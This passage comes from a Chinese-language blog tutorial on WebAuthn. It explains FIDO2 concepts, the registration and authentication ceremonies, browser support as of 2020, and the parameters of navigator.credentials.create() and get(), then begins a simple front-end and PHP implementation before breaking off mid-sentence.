WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 